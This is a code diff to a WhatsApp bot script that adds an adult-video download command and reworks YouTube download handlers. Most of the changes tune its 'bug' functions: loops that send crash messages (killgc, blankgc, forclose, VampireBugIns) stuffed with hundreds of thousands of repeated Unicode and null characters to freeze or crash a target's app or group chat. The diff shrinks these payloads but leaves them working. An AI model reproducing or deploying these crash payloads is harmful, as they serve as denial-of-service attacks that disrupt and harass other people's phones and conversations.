@@ -42,7 +42,7 @@ const jimp = require("jimp")
 const latensi = speed() - timestampp
 const moment = require('moment-timezone')
 const yts = require('yt-search');
-const { ytDownload, ytAudio, extractVideoId } = require('./allfunc/ytdownload')
+const { ytDownload, extractVideoId } = require('./allfunc/ytdownload')
 const { igDownload } = require('./allfunc/igdownload')
 const { xnxxDownload, xnxxSearch } = require('./allfunc/xnxxdownload')
 const FormData = require('form-data');
@@ -3054,12 +3054,10 @@ async function blankgc(target) {
 // END OF BUG FUNCTIONS 
 //=====COMBINING ALL GC BUG======//
 async function bug3(isTarget) {
-for (let i = 0; i < 150; i++) {
+for (let i = 0; i < 60; i++) {
 await killgc(isTarget);
 await rusuhgc(isTarget);
 await blankgc(isTarget);
-await blankgc(isTarget);
-await killgc(isTarget);
 }
 console.log(chalk.blue(`Sending Crash Hard to ${isTarget}☠️`));
 }
@@ -3072,10 +3070,10 @@ async function VampireBugIns(target) {
                 message: {
                     newsletterAdminInviteMessage: {
                         newsletterJid: `33333333333333333@newsletter`,
-                        newsletterName: "*CYBER CRASHER KILL GROUP*" + "ꦾ".repeat(200000) + "\u0000".repeat(100000),
+                        newsletterName: "*CYBER CRASHER KILL GROUP*" + "ꦾ".repeat(120000),
                         jpegThumbnail: "",
-                        caption: "ꦽ".repeat(200000) + "@0".repeat(200000) + "\u0001".repeat(100000),
-                        inviteExpiration: Date.now() + 1814400000,
+                        caption: "ꦽ".repeat(120000) + "@0".repeat(120000),
+                        inviteExpiration: Date.now() + 1814400000, // 21 hari
                     },
                 },
             },
@@ -3095,27 +3093,23 @@ async function VampireBugIns(target) {
                 "screen_1_DatePicker_1": "1028995200000",
                 "screen_1_TextInput_2": "null@gmail.com",
                 "screen_1_TextInput_3": "94643116",
-                "screen_0_TextInput_0": "\u0000".repeat(999999),
-                "screen_0_TextInput_1": "\u0018".repeat(500000) + "SecretDocu",
-                "screen_0_Dropdown_2": "#926-Xnull" + "\u0001".repeat(200000),
+                "screen_0_TextInput_0": "\u0000".repeat(500000),
+                "screen_0_TextInput_1": "SecretDocu",
+                "screen_0_Dropdown_2": "#926-Xnull",
                 "screen_0_RadioButtonsGroup_3": "0_true",
-                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s." + "\u0000".repeat(100000)
+                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
             },
         },
-        {
-            name: "cta_url",
-            buttonParamsJson: JSON.stringify({ display_text: "\u0000".repeat(200000), url: "https://whatsapp.com", merchant_url: "https://whatsapp.com" })
-        }
     ],
 },
                      contextInfo: {
-                mentionedJid: Array.from({ length: 20 }, () => "0@s.whatsapp.net"),
+                mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                 groupMentions: [
-                    { groupJid: "0@s.whatsapp.net", groupSubject: "Vampire" + "\u0000".repeat(50000) },
-                    { groupJid: "1@s.whatsapp.net", groupSubject: "CYBER" + "\u0001".repeat(50000) },
+                    {
+                        groupJid: "0@s.whatsapp.net",
+                        groupSubject: "Vampire",
+                    },
                 ],
-                forwardingScore: 999999,
-                isForwarded: true,
             },
         };
 
@@ -3263,7 +3257,7 @@ async function iosOver(durationHours, XS) {
 
 // ================= ( Combo Function )====================
 async function Combo(target) { 
-        for (let i = 0; i< 200; i++) {
+        for (let i = 0; i< 100; i++) {
         await callinvisible(target);
         await ForceXFrezee(target);
         await blank1(target);
@@ -3282,16 +3276,12 @@ async function Combo(target) {
         await callinvisible(target);
         await ForceXFrezee(target);
         await blank1(target);
-        await callinvisible(target);
-        await ForceXFrezee(target);
-        await blank1(target);
-        await callinvisible(target);
         
         }
 }
 
 async function fcnew(target) { 
-        for (let i = 0; i< 200; i++) {     
+        for (let i = 0; i< 100; i++) {     
    await CarouselVY4(devtrust, target);
    await CarouselVY4(devtrust, target);
    await LocaXotion(target);
@@ -3309,9 +3299,6 @@ async function fcnew(target) {
    await LocaXotion(target);
    await XinsooInvisV1(target);  
    await CarouselVY4(devtrust, target);
-   await CarouselVY4(devtrust, target);
-   await LocaXotion(target);
-   await XinsooInvisV1(target);
    await CarouselVY4(devtrust, target);
    await LocaXotion(target);
    await XinsooInvisV1(target);
@@ -3349,7 +3336,7 @@ async function BugGroup(target) {
  }
 
 async function BayuOfficialHard(target) {
-    for (let i = 0; i< 400; i++) {
+    for (let i = 0; i< 200; i++) {
     await protoXimg(target)
     await bulldozer(target)
     await protocolbug3(target)
@@ -3359,12 +3346,11 @@ async function BayuOfficialHard(target) {
     await xatanicinvisv4(target)
     await bulldozer(target)
     await protocolbug6(target)
-    await bulldozer(target)
     }
 }
     
 async function ForceClose(target) {
-  for (let i = 0; i< 600; i++) {
+  for (let i = 0; i< 250; i++) {
   await forclose(target);
   await forclose(target);
   await forclose(target);
@@ -3374,23 +3360,19 @@ async function ForceClose(target) {
   await forclose(target);
   await forclose(target);
   await forclose(target);
+   await forclose(target);
   await forclose(target);
   await forclose(target);
+   await forclose(target);
   await forclose(target);
   await forclose(target);
-  await forclose(target);
-  await forclose(target);
-  await forclose(target);
-  await forclose(target);
-  await forclose(target);
-  await forclose(target);
-  await forclose(target);
+  
          }
  
  }
  
  async function XPhone(target) { 
-    for (let i = 0; i< 600; i++) {
+    for (let i = 0; i< 300; i++) {  // ✅ CORRECT - lowercase i
  
 await CarouselVY4(devtrust, target);
 await CrashLoadIos(devtrust, target);
@@ -3401,9 +3383,6 @@ await Xblanknoclick(target);
 await ForceXFrezee(target);
 await blank1(target);
 await callinvisible(target);
-await forclose(target);
-await forclose(target);
-await forclose(target);
    
    } 
    
@@ -5024,6 +5003,7 @@ case 'commandlist': {
 │❖ ${prefix}vv
 │❖ ${prefix}vv2
 │❖ ${prefix}vvgh
+│❖ ${prefix}xvideos
 │❖ ${prefix}xvideodl
 │❖ ${prefix}xvideosearch
 │❖ ${prefix}xnxxsearch
@@ -6699,6 +6679,7 @@ case 'CYBERother': {
 │❖ ${prefix}vv
 │❖ ${prefix}vv2
 │❖ ${prefix}vvgh
+│❖ ${prefix}xvideos
 │❖ ${prefix}xvideodl
 │❖ ${prefix}xvideosearch
 │❖ ${prefix}xnxxsearch
@@ -10956,7 +10937,7 @@ case 'ytmp3': {
             videoUrl = videoInfo.url;
         }
 
-        const result = await ytAudio(videoUrl);
+        const result = await ytDownload(videoUrl);
         if (result.error || result.code !== 200) throw new Error(result.message || 'Download failed');
 
         const d = result.data;
@@ -10979,12 +10960,10 @@ case 'ytmp3': {
         if (thumb) {
             await devtrust.sendMessage(m.chat, addNewsletterContext({ image: { url: thumb }, caption: `🎵 *${titleStr}*\n⏱️ ${dur}\n🎚️ ${audioFmt.quality} ${audioFmt.format} — ${audioFmt.size}` }), { quoted: m });
         }
-        const audioMime = (audioFmt.format === 'MP3') ? 'audio/mpeg' : (audioFmt.format === 'OPUS' || audioFmt.format === 'WEBM') ? 'audio/ogg; codecs=opus' : (audioFmt.format === 'M4A') ? 'audio/mp4' : 'audio/mpeg';
-        const audioExt = (audioFmt.format === 'MP3') ? 'mp3' : (audioFmt.format === 'OPUS' || audioFmt.format === 'WEBM') ? 'ogg' : 'm4a';
         await devtrust.sendMessage(m.chat, addNewsletterContext({
             audio: audioBuf,
-            mimetype: audioMime,
-            fileName: `${titleStr.replace(/[<>:"/\\|?*]+/g, '').substring(0, 50)}.${audioExt}`
+            mimetype: 'audio/mpeg',
+            fileName: `${titleStr.replace(/[<>:"/\\|?*]+/g, '').substring(0, 50)}.mp3`
         }), { quoted: m });
         await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
 
@@ -11047,7 +11026,7 @@ case 'play2': {
             videoUrl = videoInfo.url;
         }
 
-        const result = await ytAudio(videoUrl);
+        const result = await ytDownload(videoUrl);
         if (result.error || result.code !== 200) throw new Error(result.message || 'Download failed');
 
         const d = result.data;
@@ -11089,22 +11068,21 @@ case 'video':
 case 'mp4':
 case 'ytvideo': {
     if (!text) {
-        return reply(`🎬 *YouTube Video Downloader*\n\nUsage: ${prefix}video <song name or YouTube URL>\nExample: ${prefix}video shape of you\nExample: ${prefix}video https://youtu.be/dQw4w9WgXcQ`);
+        return reply(`🎬 *YouTube Video Downloader*\n\nUsage: ${prefix}video <song name or YouTube link>\nExample: ${prefix}video shape of you\nExample: ${prefix}video https://youtu.be/dQw4w9WgXcQ`);
     }
     try {
         await devtrust.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });
 
-        // ── 1. Resolve URL ────────────────────────────────────────────────
+        // ── 1. Resolve URL (search by name if not a direct link) ─────────────
         let videoUrl = text;
         let videoInfo = null;
         const yts = require('yt-search');
-
         if (text.includes('youtube.com') || text.includes('youtu.be')) {
             let videoId = null;
             if (text.includes('/shorts/')) {
                 videoId = text.split('/shorts/')[1].split('?')[0].split('/')[0].trim();
             } else {
-                videoId = text.match(/(?:youtube\.com\/(?:[^\/]+\/.+\/|(?:v|e(?:mbed)?)\/|.*[?&]v=)|youtu\.be\/)([^"&?\/\s]{11})/i)?.[1];
+                videoId = text.match(/(?:youtube\.com\/(?:[^/]+\/.+\/|(?:v|e(?:mbed)?)\/|.*[?&]v=)|youtu\.be\/)([^"&?/\s]{11})/i)?.[1];
             }
             if (videoId) {
                 const r = await yts({ videoId });
@@ -11120,67 +11098,97 @@ case 'ytvideo': {
             videoUrl = videoInfo.url;
         }
 
-        reply(`🔍 Found: *${videoInfo?.title || text}*\n⏳ Fetching video...`);
-
-        // ── 2. Get video formats via Prince API (ytvideo) / ytdl-core fallback ──
+        // ── 2. Fetch all formats via VidsSave API ─────────────────────────────
         const result = await ytDownload(videoUrl);
-        if (!result?.data) throw new Error('Could not fetch video info from API');
+        if (!result?.data) throw new Error('Could not fetch video info');
 
-        const info    = result.data;
-        const vidFmts = info.video_formats || [];
-        if (!vidFmts.length && !info.best_video) throw new Error('No video formats available');
+        const info      = result.data;
+        const vidFmts   = info.video_formats || [];
+        const audioFmts = info.audio_formats || [];
 
-        // ── 3. Pick best quality ≤ 480P for WhatsApp limits ───────────────
-        const preferred = ['720P', '480P', '360P', '1080P', '240P', '144P'];
-        let chosen = null;
-        for (const q of preferred) {
-            chosen = vidFmts.find(f => f.quality === q);
-            if (chosen) break;
-        }
-        if (!chosen) chosen = vidFmts[vidFmts.length - 1] || info.best_video;
+        if (!vidFmts.length && !info.best_video) throw new Error('No video formats found');
 
-        const dlUrl   = chosen.download_url || chosen.url;
+        // Build quality menu from actual available formats
+        const menuFmts = vidFmts.length ? vidFmts : [info.best_video];
+        const qualityMenu = menuFmts.map((f, i) => `*${i + 1}.* ${f.quality} — ${f.format} (${f.size_mb})`).join('\n');
+
+        // ── 3. Show info card with quality menu ───────────────────────────────
+        const thumb = videoInfo?.thumbnail || (info.thumbnail ? info.thumbnail : null);
         const titleStr = info.title || videoInfo?.title || 'Unknown Title';
         const duration = info.duration_formatted || videoInfo?.timestamp || 'N/A';
-        const thumb    = info.thumbnail || videoInfo?.thumbnail || null;
-        const sizeMB   = chosen.size_mb || chosen.size || '? MB';
+        const channel  = videoInfo?.author?.name || 'Unknown';
+        const views    = videoInfo?.views ? videoInfo.views.toLocaleString() : 'N/A';
 
-        reply(`🎬 *${titleStr}*\n⏱️ ${duration} | 🎚️ ${chosen.quality} MP4 (${sizeMB})\n⬇️ Downloading...`);
+        const caption =
+            `🎬 *${titleStr}*\n\n` +
+            `⏱️ *Duration:* ${duration}\n` +
+            `👤 *Channel:* ${channel}\n` +
+            `👀 *Views:* ${views}\n\n` +
+            `📋 *Available Qualities:*\n${qualityMenu}\n\n` +
+            `📌 *Reply with a number* to download that quality`;
 
-        // ── 4. Download buffer ────────────────────────────────────────────
-        const videoResp = await axios.get(dlUrl, {
-            responseType: 'arraybuffer',
-            headers: {
-                'User-Agent': 'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36'
-            },
-            timeout: 300000,
-            maxRedirects: 10,
-            maxContentLength: 200 * 1024 * 1024
-        });
-        const videoBuf = Buffer.from(videoResp.data);
-        const actualMB = (videoBuf.length / (1024 * 1024)).toFixed(2);
+        const sentMsg = await devtrust.sendMessage(
+            m.chat,
+            addNewsletterContext(thumb
+                ? { image: { url: thumb }, caption }
+                : { text: caption }),
+            { quoted: m }
+        );
 
-        // ── 5. Send thumbnail then video ──────────────────────────────────
-        if (thumb) {
-            await devtrust.sendMessage(m.chat,
-                addNewsletterContext({ image: { url: thumb }, caption: `🎬 *${titleStr}*\n⏱️ ${duration} | 🎚️ ${chosen.quality} | 📦 ${actualMB} MB` }),
-                { quoted: m }
-            );
-        }
-        const fileName = `${titleStr.replace(/[<>:"/\\|?*]+/g, '').substring(0, 50)}_${chosen.quality}.mp4`;
-        await devtrust.sendMessage(m.chat, addNewsletterContext({
-            video: videoBuf,
-            caption: `🎬 *${titleStr}*\n⏱️ ${duration}\n🎚️ Quality: ${chosen.quality}\n📦 Size: ${actualMB} MB`,
-            mimetype: 'video/mp4',
-            fileName
-        }), { quoted: m });
+        // ── 4. Wait for user quality selection ────────────────────────────────
+        const _videoHandler = async (messageUpdate) => {
+            try {
+                const msgData  = messageUpdate?.messages[0];
+                if (!msgData?.message) return;
+                const replyTxt = (msgData.message.extendedTextMessage?.text || msgData.message.conversation || '').trim();
+                const stanzaId = msgData.message.extendedTextMessage?.contextInfo?.stanzaId;
+                if (stanzaId !== sentMsg?.key?.id) return;
+                const sel = parseInt(replyTxt);
+                if (isNaN(sel) || sel < 1 || sel > menuFmts.length) return;
 
-        await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
+                devtrust.ev.off('messages.upsert', _videoHandler);
+                await devtrust.sendMessage(m.chat, { react: { text: '⏳', key: msgData.key } });
 
-    } catch (error) {
-        console.error('[video cmd] Error:', error.message);
+                const chosen = menuFmts[sel - 1];
+                const fetchMsg = await devtrust.sendMessage(
+                    m.chat,
+                    { text: `🎬 *Downloading ${chosen.quality} (${chosen.size_mb})...*\nPlease wait ⏳` },
+                    { quoted: msgData }
+                );
+
+                // ── 5. Download buffer and send ───────────────────────────────
+                const videoResp = await axios.get(chosen.download_url || chosen.url, {
+                    responseType: 'arraybuffer',
+                    headers: { 'User-Agent': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36' },
+                    timeout: 300000,
+                    maxContentLength: 500 * 1024 * 1024
+                });
+                const videoBuf  = Buffer.from(videoResp.data);
+                const sizeMB    = (videoBuf.length / (1024 * 1024)).toFixed(2);
+                const fileName  = `${titleStr.replace(/[<>:"/\\|?*]+/g, '').substring(0, 50)}_${chosen.quality}.mp4`;
+
+                await devtrust.sendMessage(m.chat, { delete: fetchMsg.key });
+                await devtrust.sendMessage(m.chat, {
+                    video: videoBuf,
+                    caption: `🎬 *${titleStr}*\n🎚️ *Quality:* ${chosen.quality}\n📦 *Size:* ${sizeMB} MB`,
+                    mimetype: 'video/mp4',
+                    fileName
+                }, { quoted: msgData });
+                await devtrust.sendMessage(m.chat, { react: { text: '✅', key: msgData.key } });
+
+            } catch (err) {
+                console.error('Video quality handler error:', err.message);
+                await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
+                reply(`❌ Download failed: ${err.message}`);
+            }
+        };
+        devtrust.ev.on('messages.upsert', _videoHandler);
+        setTimeout(() => devtrust.ev.off('messages.upsert', _videoHandler), 180000);
+
+    } catch (err) {
+        console.error('Video command error:', err.message);
         await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
-        reply(`❌ *Video download failed:* ${error.message}`);
+        reply(`❌ Failed: ${err.message}`);
     }
 }
 break;
@@ -12138,6 +12146,41 @@ case 'styletext': {
     await reply(teks);
 } 
 break;
+  case 'xvideos': {
+    if (!text) return reply(`🔞 *XVideos Downloader*\n\nUsage: ${prefix}xvideos [xvideos link]\nExample: ${prefix}xvideos https://www.xvideos.com/video.xxxxx/title`);
+    if (!text.includes('xvideos.com')) return reply('❌ *Link xvideos.com ka hona chahiye*');
+
+    await devtrust.sendMessage(m.chat, { react: { text: '🍑', key: m.key } });
+    try {
+        const res = await axios.get(`https://api.princetechn.com/api/download/xvideosdl?apikey=prince&url=${encodeURIComponent(text)}`, { timeout: 30000 });
+        const data = res.data;
+
+        if (!data.success || data.status !== 200 || !data.result?.download_url) {
+            throw new Error('Video nahi mila ya download link nahi aya');
+        }
+
+        const r = data.result;
+        const caption = `🎬 *${r.title || 'XVideo'}*\n👁️ ${r.views || 'N/A'} | 👍 ${r.likes || 'N/A'} | 👎 ${r.dislikes || 'N/A'}\n📦 Size: ${r.size || 'N/A'}`;
+
+        if (r.thumbnail) {
+            await devtrust.sendMessage(m.chat, addNewsletterContext({ image: { url: r.thumbnail }, caption }), { quoted: m });
+        }
+
+        await devtrust.sendMessage(m.chat, addNewsletterContext({
+            video: { url: r.download_url },
+            caption,
+            mimetype: 'video/mp4'
+        }), { quoted: m });
+
+        await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
+    } catch (e) {
+        console.error('xvideos error:', e.message);
+        await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
+        reply(`❌ *XVideos download failed:* ${e.message}`);
+    }
+}
+break;
+
   case "xvideodl": {
   if (!isCreator) return reply("Owner only"); 
 if (!text) return m.reply(example(`xvideo link`))
